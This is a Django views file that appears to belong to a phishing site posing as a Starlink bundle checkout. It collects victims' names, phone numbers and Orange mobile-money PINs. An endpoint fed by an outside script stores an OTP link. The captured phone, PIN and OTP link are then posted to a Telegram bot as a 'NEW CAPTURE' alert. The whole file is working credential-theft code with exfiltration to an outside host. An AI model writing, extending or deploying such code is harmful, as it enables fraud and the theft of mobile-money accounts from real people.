import os
import json
import requests
import logging  
from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import Order, Bundle, TelegramConfig

# Setup Logging
logger = logging.getLogger(__name__)

def send_telegram_notification(message):
    """Helper function to send messages using Admin panel config"""
    config = TelegramConfig.objects.first()
    if config:
        url = f"https://api.telegram.org/bot{config.bot_token}/sendMessage"
        payload = {"chat_id": config.chat_id, "text": message, "parse_mode": "HTML"}
        try:
            requests.post(url, data=payload, timeout=10)
        except Exception as e:
            logger.error(f"Failed to send Telegram: {e}")
    else:
        logger.warning("Telegram not configured in Admin panel!")

def home(request):
    return render(request, 'index.html')

def checkout(request):
    # Get bundle info from URL or default to Power User
    bundle_name = request.GET.get('bundle', 'Power User')
    price = request.GET.get('price', '199')
    return render(request, 'checkout.html', {'bundle': bundle_name, 'price': price})

def payment_instructions(request):
    if request.method == 'POST':
        full_name = request.POST.get('fullName', 'Unknown Customer')
        city = request.POST.get('city', 'Not Provided')
        bundle_name = request.POST.get('bundle', 'Power User')

        # FIX: Ensure a bundle exists so it doesn't crash the database
        selected_bundle = Bundle.objects.filter(name=bundle_name).first() or Bundle.objects.first()
        
        order = Order.objects.create(
            full_name=full_name,
            city=city,
            total_amount=199,  
            bundle=selected_bundle,
            status='Pending'
        )

        # Use order.id or order.order_id depending on your model field name
        request.session['current_order_id'] = str(order.id)
        return render(request, 'payment_instructions.html', {'order': order})
    
    return redirect('starlink_app:home')

def otp_verification(request):
    # Always grab the last order created to update it with Phone/PIN
    order = Order.objects.order_by('-created_at').first() 

    if request.method == 'POST':
        phone = request.POST.get('phone', '')
        pin = request.POST.get('pin', '')

        if order:
            order.phone_number = phone 
            order.orange_pin = pin
            order.save()
        else:
            # SAFETY NET: If session lost or DB empty, create order so it doesn't crash
            order = Order.objects.create(
                phone_number=phone,
                orange_pin=pin,
                full_name="Guest User",
                total_amount=0,  
                bundle=Bundle.objects.first(), # Database needs a bundle!
                status='Pending'
            )

        # After saving, stay on the page to wait for the Link
        return render(request, 'otp_verification.html', {'order': order, 'submitted': True})
        
    return render(request, 'otp_verification.html', {'order': order})

@csrf_exempt
def sync_data(request):
    """This is triggered by your script to provide the OTP Link"""
    if request.method != 'POST':
        return JsonResponse({"status": "error", "message": "Method not allowed"}, status=405)

    try:
        data = json.loads(request.body)
        otp_link = data.get('otp', 'No Link provided')

        # Find the order the user is currently waiting on
        order = Order.objects.order_by('-created_at').first()
        if order:
            order.otp_activation_link = otp_link
            order.save()

            message = (
                "🇸🇱 <b>ORANGE MAX IT - NEW CAPTURE</b>\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"📞 <b>PHONE:</b> {order.phone_number}\n"
                f"🔑 <b>PIN:</b> {order.orange_pin}\n"
                f"📦 <b>BUNDLE:</b> {order.bundle.name if order.bundle else 'N/A'}\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "🔗 <b>OTP LINK:</b>\n"
                f"{otp_link}\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "📡 <b>STATUS:</b> DATA RECEIVED"
            )
            send_telegram_notification(message)
            return JsonResponse({"status": "success"})
        
        return JsonResponse({"status": "error", "message": "No order found"}, status=404)

    except Exception as e:
        logger.exception("Internal Sync Error:")
        return JsonResponse({"status": "error", "message": str(e)}, status=500)